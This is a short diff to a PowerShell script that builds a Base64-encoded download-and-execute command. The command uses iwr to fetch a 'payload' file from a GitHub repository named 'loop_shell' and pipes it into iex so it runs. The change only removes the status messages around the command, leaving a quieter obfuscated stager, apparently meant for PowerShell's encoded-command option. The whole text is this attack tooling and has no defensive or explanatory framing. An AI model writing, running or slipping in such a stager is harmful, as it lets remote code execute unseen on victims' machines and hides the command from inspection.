@@ -1,4 +1,4 @@
-$command = 'Write-Host "Connecting..."; iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex; Write-Host "Done"'
+$command = 'iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 [Convert]::ToBase64String($bytes)
 
